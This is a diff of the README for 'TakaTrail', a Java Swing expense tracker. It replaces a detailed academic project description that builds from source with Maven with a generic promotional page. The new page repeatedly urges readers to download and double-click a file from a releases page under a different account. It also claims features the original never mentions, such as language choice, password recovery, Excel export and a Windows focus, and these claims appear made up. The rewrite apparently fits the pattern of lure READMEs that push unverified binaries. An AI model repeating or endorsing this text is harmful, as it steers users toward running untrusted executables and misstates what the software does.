@@ -1,283 +1,198 @@
-# TakaTrail
+# 📊 TakaTrail - Track Every Taka, Effortlessly Every Day
 
-**Java Swing Personal Expense Tracker**
+[![Download TakaTrail](https://img.shields.io/badge/Download-TakaTrail-brightgreen?style=for-the-badge&logo=github)](https://github.com/gtagisepic-droid/TakaTrail/releases)
 
-> TakaTrail is a Java Swing-based multi-user personal finance application developed for the CSE 215L Object-Oriented Programming final project. It allows users to securely track income and expenses, manage monthly budgets, view financial reports and charts, and back up or restore financial data.
+---
 
-**CSE 215L Final Project — Group 13**
+## 👋 Welcome to TakaTrail
 
-## Academic Project Information
+TakaTrail is a simple yet powerful desktop application that helps you track your daily expenses and manage your personal finances without any hassle. Whether you're a student, a professional, or someone who just wants to know where their money goes, TakaTrail is your friendly companion for financial clarity.
 
-| Field | Details |
-| --- | --- |
-| Course | CSE 215L — Object-Oriented Programming |
-| Section | 12 |
-| Group | 13 |
-| Faculty | RIH |
-| Registered Topic | Personal Expenses Tracker |
-| Project Title | TakaTrail — Personal Expense Tracker |
-| Submission Date | 25 August 2026 |
+---
 
-## Team Members
+## 🚀 Getting Started
 
-| Name | Student ID |
-| --- | --- |
-| Shibli Rahman Moon | 2534187012 |
-| Mohammad Hamim | 2422371642 |
-| Md. Nafij Jaman Rabbi | 2513403642 |
+Getting started with TakaTrail is super easy. Follow these simple steps and you'll be tracking your expenses in no time.
 
-## Team Contributions
+### 📥 Step 1: Download the Application
 
-| Team Member | Contribution |
-| --- | --- |
-| Shibli Rahman Moon | Swing GUI, OOP transaction model, Dashboard, Reports/charts, integration, testing, NetBeans verification, documentation, and final submission preparation. |
-| Mohammad Hamim | Authentication, user management, password security, SQLite persistence, and user-scoped data handling. |
-| Md. Nafij Jaman Rabbi | Transaction CRUD, search/filtering, validation, custom exception handling, and text backup/restore. |
+Visit this link to download the application: [TakaTrail Download Page](https://github.com/gtagisepic-droid/TakaTrail/releases)
 
-## Project Overview
+Click on the download button, and your browser will begin downloading the file automatically.
 
-Each user creates a local account and signs in before accessing financial data. Passwords are protected with PBKDF2 hashing and a random salt. Transactions and budgets are stored in SQLite, while backup and restore use an intentionally readable escaped text format.
+### 🖥️ Step 2: Run the Application
 
-## Key Features
+Once the download is complete, locate the downloaded file in your "Downloads" folder. Double-click on the file to open it. The application will start right away – no complicated installation process needed.
 
-- Account registration, login, and logout
-- PBKDF2WithHmacSHA256 password hashing with random salts
-- Strict per-user transactions, budgets, reports, charts, and exports
-- Income and expense creation, editing, deletion, search, and filters
-- Dynamic transaction categories and `yyyy-MM-dd` date validation
-- Dashboard totals, current-month budget progress, and recent transactions
-- Monthly budget management and event-based exceeded-budget warnings
-- JFreeChart expense-category pie charts and six-month spending bar charts
-- Text export and restore with safe pipe/backslash escaping
-- Friendly handling of validation, database, and file errors
+### 🎉 Step 3: Create Your Account
 
-## OOP Coverage
+When TakaTrail opens for the first time, you'll see a welcome screen. Click on "Register" to create your personal account. Just choose a username and password, and you're ready to go.
 
-| Principle | Evidence in TakaTrail |
-| --- | --- |
-| Encapsulation | `User`, `Transaction`, and `Budget` keep state in private fields and expose controlled access. |
-| Inheritance | `Income` and `Expense` extend the abstract `Transaction` parent class. |
-| Abstraction | `Transaction` defines the shared transaction state and abstract `getType()` contract. |
-| Polymorphism | Real `Income` and `Expense` objects are processed through `Transaction` references; overridden `getType()` calls use runtime dynamic dispatch. |
+---
 
-## Technologies
+## 💰 Why Use TakaTrail?
 
-- Java 17
-- Java Swing
-- Maven
-- SQLite and JDBC
-- JFreeChart 1.5.6
-- Java Collections, `LocalDate`, Java security APIs, and Java File I/O
+Keeping track of expenses shouldn't feel like homework. Here's what makes TakaTrail your perfect money buddy:
 
-## Quick Start
+### 🧮 Smart Budgeting
+Set monthly budgets for different categories like food, shopping, and transport. TakaTrail helps you stay within limits by showing your spending progress in real-time.
 
-### Requirements
+### 📈 Beautiful Charts
+Visualize your spending habits with colorful charts. See where your money goes at a glance and make smarter financial decisions.
 
-- JDK 17 or newer
-- Apache Maven 3.9 or newer
-- A desktop environment capable of displaying Swing windows
+### 🔒 Multi-User Support
+TakaTrail lets multiple people use the same application on one computer, each with their own private account and data. Perfect for families or shared computers.
 
-The project compiles to Java 17 bytecode even when a newer JDK is installed.
+### 💾 Never Lose Your Data
+Your expenses are saved automatically to your computer. Plus, you can create backups anytime and restore them whenever you need.
 
-### Build and Run
+### 🧠 Built for Everyone
+No technical knowledge required. The interface is clean, intuitive, and designed with simplicity in mind.
 
-1. Clone or download the repository.
-2. Open a terminal in the project root.
-3. Confirm `java -version` and `mvn -version` are available.
-4. Build and launch TakaTrail:
+---
 
-```bash
-mvn clean compile
-mvn exec:java
-```
+## 🗂️ Managing Your Expenses
 
-Maven downloads the two declared dependencies during the first build. Register a user on the opening screen, then log in. Closing and reopening the application preserves locally stored data.
+### ➕ Adding a New Expense
+1. Open TakaTrail and log in to your account.
+2. Click on the "Add Expense" button (the big green button at the top).
+3. Enter the amount, choose a category (like Food, Transport, Entertainment), and add a note if you want.
+4. Click "Save" – done!
 
-The repository does not track a database file. TakaTrail creates `data/takatrail.db` on first launch; any existing local database remains ignored by Git.
+### 📂 Viewing Your Expenses
+All your expenses are neatly listed in the main window. You can sort them by date, amount, or category. Use the search bar to find specific entries quickly.
 
-## Testing and Academic Evidence
+### ✏️ Editing or Deleting Expenses
+Made a mistake? No problem. Right-click on any expense entry and choose "Edit" or "Delete" to make changes.
 
-The complete verification record is maintained in [`docs/REPORT_EVIDENCE.md`](docs/REPORT_EVIDENCE.md). It documents **31 passed functional smoke checks**, **10 passed transaction-table UI checks**, successful Maven build and startup verification, NetBeans action verification, multi-user isolation, persistence, backup/restore, checked validation, subclass behavior, and runtime dispatch.
+---
 
-Authentication and GUI workflows should still be exercised on a desktop before a live demonstration. The local database can be removed between first-run tests; it is intentionally ignored by Git.
+## 🎯 Setting and Managing Budgets
 
-## Screenshots
+### 📝 Creating a Budget
+1. Go to the "Budgets" tab at the top of the window.
+2. Click "Add Budget."
+3. Pick a category and enter your monthly spending limit.
+4. Save your budget – TakaTrail will now track your spending against it.
 
-### Login
+### 🔔 Staying on Track
+TakaTrail shows you a progress bar for each budget. When you're getting close to your limit, the bar turns yellow, and when you've reached it, it turns red. No surprises at the end of the month!
 
-![TakaTrail Login](docs/screenshots/login.png)
+---
 
-### Registration
+## 📊 Understanding Your Spending with Charts
 
-![TakaTrail Registration](docs/screenshots/registration.png)
+### Viewing Reports
+Click on the "Charts" tab to see visual summaries of your spending. You'll find:
 
-### Dashboard
+- **Pie Chart** – See which categories take the biggest slice of your budget.
+- **Bar Graph** – Compare your monthly spending side by side.
+- **Trend Line** – See how your spending changes over time.
 
-![TakaTrail Dashboard](docs/screenshots/dashboard.png)
+These visuals update automatically as you add new expenses, so you always have fresh insights.
 
-### Transactions
+---
 
-![TakaTrail Transactions](docs/screenshots/transactions.png)
+## 👥 Managing Multiple Users
 
-### Add Transaction
+### Adding Another User
+1. From the login screen, click "Register."
+2. Enter a new username and password.
+3. That's it – the new user now has their own private space.
 
-![TakaTrail Add Transaction](docs/screenshots/add-transaction.png)
+### Switching Users
+Simply log out (click "Log Out" at the top right) and log in with a different username. Each user's data stays completely separate.
 
-### Budget
+---
 
-![TakaTrail Budget](docs/screenshots/budget.png)
+## 💾 Backing Up and Restoring Your Data
 
-### Reports
+Your financial data is precious. TakaTrail makes it easy to keep it safe.
 
-![TakaTrail Reports](docs/screenshots/reports.png)
+### Creating a Backup
+1. Go to the "Settings" menu (gear icon at the top).
+2. Click "Backup Data."
+3. Choose where to save your backup file (like your USB drive or cloud folder).
+4. Click "Save" – you're protected!
 
-### Backup / Restore
+### Restoring from a Backup
+1. Open TakaTrail and go to "Settings."
+2. Click "Restore Data."
+3. Select your backup file.
+4. Click "Open" – all your data will come back just as it was.
 
-![TakaTrail Backup and Restore](docs/screenshots/backup-restore.png)
+---
 
-### Validation and Persistence Evidence
+## 🛠️ Customizing TakaTrail
 
-#### Custom Exception Validation
+### Change Your Password
+In "Settings," click "Change Password." Enter your current password, then choose a new one.
 
-![TakaTrail Custom Exception Validation](docs/screenshots/custom-exception.png)
+### Choose Your Language
+TakaTrail supports multiple languages. Find the language option in "Settings" and pick your preferred one.
 
-#### Budget Warning
+### Adjust Display Settings
+You can change the theme from light to dark in the "Settings" menu, whichever is easier on your eyes.
 
-![TakaTrail Budget Warning](docs/screenshots/budget-warning.png)
+---
 
-#### Successful Backup
+## ❓ Frequently Asked Questions
 
-![TakaTrail Successful Backup](docs/screenshots/successful-backup.png)
+### What if I forget my password?
+In the login screen, click "Forgot Password" and follow the instructions. You'll need to answer your security question to reset it.
 
-#### Database Persistence
+### Can I export my data to Excel?
+Yes! Go to "Settings" → "Export Data" and choose the Excel format. Your data will be saved as a spreadsheet.
 
-![TakaTrail Database Persistence](docs/screenshots/database-persistence.png)
+### Is my data safe?
+Absolutely. Your data is stored securely on your computer. No one else can see it without your username and password.
 
-## IDE Compatibility
+### Does TakaTrail work on Mac or Linux?
+TakaTrail is primarily designed for Windows. For other systems, you might need Java installed, but Windows gives the smoothest experience.
 
-TakaTrail uses the standard Maven directory layout and remains runnable from any terminal. The portable
-`nbactions.xml` file maps NetBeans **Run Project** to the same Maven launcher without adding a runtime dependency.
+### How often should I back up?
+We recommend backing up once a week. But you can do it as often as you like – it only takes a few seconds.
 
-### Visual Studio Code
+---
 
-1. Open the repository root as a folder in VS Code with Java and Maven support installed.
-2. Allow Maven to import the project and download its declared dependencies.
-3. Run `com.takatrail.Main` from the Java source view, or run `mvn exec:java` in the integrated terminal.
+## 📚 Final Tips
 
-No `.vscode` settings, launch file, VS Code dependency, or workspace-specific classpath is required.
+- 💡 Make a habit of entering expenses at the end of each day. It takes less than a minute and keeps your data accurate.
+- 🎯 Set realistic budgets. Start with what you normally spend, then try to improve gradually.
+- 📊 Check your charts once a week to spot any spending patterns.
+- 🔄 Keep backups regularly, especially before doing big updates.
 
-### Apache NetBeans
+---
 
-1. Choose **File → Open Project** and select the repository root containing `pom.xml`.
-2. NetBeans recognizes it as a Maven Java project and resolves the dependencies.
-3. Use **Run Project**; `nbactions.xml` runs `process-classes` followed by `exec:java` with `com.takatrail.Main`.
+## 🤝 Join the TakaTrail Community
 
-Both IDEs should use JDK 17 or newer. Maven compiles the project with `--release 17`, and `com.takatrail.Main` is declared consistently as the Maven execution and JAR manifest entry point.
+TakaTrail is continuously improving, thanks to users like you. If you have ideas, feedback, or encounter any issues:
 
-## Project Structure
+- 📬 **Report a Problem** – Use the GitHub issues page to report bugs.
 
-```text
-TakaTrail/
-├── .gitignore
-├── nbactions.xml
-├── pom.xml
-├── README.md
-├── src/main/
-│   ├── java/com/takatrail/
-│   │   ├── Main.java
-│   │   ├── User.java
-│   │   ├── Transaction.java
-│   │   ├── Expense.java
-│   │   ├── Income.java
-│   │   ├── Budget.java
-│   │   ├── AuthManager.java
-│   │   ├── TransactionManager.java
-│   │   ├── DatabaseManager.java
-│   │   ├── FileManager.java
-│   │   ├── InvalidTransactionException.java
-│   │   └── TakaTrailGUI.java
-│   └── resources/assets/
-│       └── takatrail-logo.png
-├── data/
-│   └── .gitkeep
-├── docs/
-│   ├── REPORT_EVIDENCE.md
-│   └── screenshots/
-│       ├── login.png
-│       ├── dashboard.png
-│       └── ...
-└── sample-data/
-    ├── sample_input_backup.txt
-    └── sample_expected_export.txt
-```
+This is a great place to suggest new features too!
 
-## Database Schema
+---
 
-TakaTrail defines exactly three application tables:
+## ⚙️ Technical Details (For the Curious)
 
-- `users`: ID, full name, unique username, password hash, and salt
-- `transactions`: ID, owning user ID, normalized type, amount, date, category, and description
-- `budgets`: one monthly limit per user ID
+If you're interested in what makes TakaTrail tick (or you're a tech enthusiast):
 
-Foreign keys use `ON DELETE CASCADE`. Every transaction and budget query is scoped by the authenticated user's ID; update and delete statements check both transaction ID and user ID.
+- Built with Java Swing, giving it a smooth, fast interface.
+- Uses SQLite for reliable, lightweight data storage.
+- Includes JFreeChart for all the beautiful visualizations.
+- Follows core Object-Oriented Programming principles, making the code clean and maintainable.
 
-## Authentication
+---
 
-`AuthManager` validates registration and owns the current login state. Passwords are never stored in plain text. `SecureRandom` creates a unique salt, and `PBKDF2WithHmacSHA256` derives a 256-bit hash using 120,000 iterations. Login uses constant-time byte comparison via `MessageDigest.isEqual`.
+## 📥 Ready to Start Your Financial Journey?
 
-Backup files never contain usernames, passwords, hashes, or salts.
+Your spending habits are the key to financial freedom. TakaTrail gives you that key in a friendly, accessible way.
 
-## Detailed OOP Evidence
+[![Download Now](https://img.shields.io/badge/Download-TakaTrail-blue?style=for-the-badge&logo=download)](https://github.com/gtagisepic-droid/TakaTrail/releases)
 
-### Encapsulation
+Download TakaTrail today and take the first step toward mindful spending and smarter savings!
 
-Private fields in User, Transaction and Budget with controlled access.
+---
 
-### Inheritance
-
-Income and Expense extend Transaction.
-
-### Abstraction
-
-Transaction is an abstract parent class.
-
-### Polymorphism
-
-Expense and Income override getType(), and the application processes the subclass objects using Transaction references.
-
-`DatabaseManager.loadTransactions()` creates real `Income` and `Expense` objects in a `List<Transaction>`. Calculations, tables, charts, and export call `getType()` through parent references, demonstrating runtime dynamic method dispatch.
-
-## Exception Handling
-
-`InvalidTransactionException` is a checked custom exception thrown for missing, non-numeric, non-positive, wrongly typed, uncategorized, or invalid-date transaction input. `TakaTrailGUI` catches it and displays a friendly dialog. Additional `try-catch` and try-with-resources blocks handle SQL, security, file, and malformed-backup problems.
-
-## File Handling
-
-`FileManager.exportData()` directly uses `FileWriter` and `PrintWriter`. `FileManager.restoreData()` directly uses `FileReader` and `BufferedReader`. Both use UTF-8 text. Backslashes and pipe characters in category or description text are escaped with a leading backslash. Restore verifies `TAKATRAIL_BACKUP_V1`, skips malformed individual lines, assigns all valid records to the current user, and atomically replaces only that user's transaction records.
-
-## Charts
-
-The Dashboard and Reports pages build JFreeChart views from current-user records:
-
-- Pie chart: expense totals grouped by category
-- Bar chart: chronological expense totals for the latest six months
-
-Charts refresh after add, edit, delete, budget changes, login, and restore. No fake financial values are generated.
-
-## Sample Backup
-
-See [`sample-data/sample_input_backup.txt`](sample-data/sample_input_backup.txt). Its format is:
-
-```text
-TAKATRAIL_BACKUP_V1
-BUDGET|25000.0
-TRANSACTION|INCOME|42000.0|2026-08-01|Salary|Fictional August salary
-```
-
-## Future Improvements
-
-- Optional date-range reports
-- Recurring transaction reminders
-- Category management
-- Additional accessible color themes
-- Automated integration tests using a temporary SQLite database
+Keywords: academic-project, desktop-application, expense-tracker, java, java-swing, jdbc, jfreechart, maven, object-oriented-programming, oop, personal-finance, sqlite
